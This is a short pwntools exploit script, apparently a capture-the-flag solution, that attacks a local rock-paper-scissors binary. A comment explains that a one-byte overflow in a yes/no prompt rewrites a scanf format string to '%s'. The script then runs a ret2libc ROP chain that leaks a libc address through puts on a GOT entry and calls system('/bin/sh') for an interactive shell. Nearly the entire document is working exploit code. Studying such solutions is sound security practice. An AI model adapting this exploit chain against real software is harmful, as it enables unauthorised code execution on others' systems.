
from pwn import *

exe = ELF("./rps")
libc = exe.libc

context.binary = exe



r = process(exe.path)


def repeat(msg):
    r.recv()
    r.send(msg)

def send_payload(payload, f=0):
    r.recv()
    r.sendline(payload)
    r.recv()

def main():
    r.recv()
    r.sendline('y')
    r.recv()
    r.sendline('y')
    r.recv()
    r.sendline("1")
    '''
    The yes and no prompt after the first choice
    can allows to write almost 0x19 bytes to instead of 3, which allows us to
    overwrite tyhe format specifier of the scanf being called for choosing rps
    option, we overwrite it with the '%s' with a one byte overflow
    gef➤  x/s 0x0000000000402008
	0x402008:	"%s"

	Doing, so we could just do the a ret2libc attack from there by giving our 
	ROP chain to the next scanf call
    '''
    repeat(b"yes\n"+ p32(0) + p64(0)*2 + p8(0x8))
    pause()
    
    pop_rdi = 0x0000000000401513
    ret = 0x0401452
    rps = 0x0401313

    payload  = b"M"*20
    payload += p64(pop_rdi)
    payload += p64(exe.got['memset'])
    payload += p64(exe.plt['puts'])
    payload += p64(rps)

    send_payload(payload)

    leak = r.recvuntil(p8(0x7f))[-6::]
    libc.address = u64(leak + p16(0)) - 0x18eaf0
    log.warn("Libc base @ 0x%x", libc.address)
    pause()
    payload = b"M"*20
    payload += p64(pop_rdi)
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(ret)
    payload += p64(libc.sym['system'])

    send_payload(payload)
    r.interactive()


if __name__ == "__main__":
    main()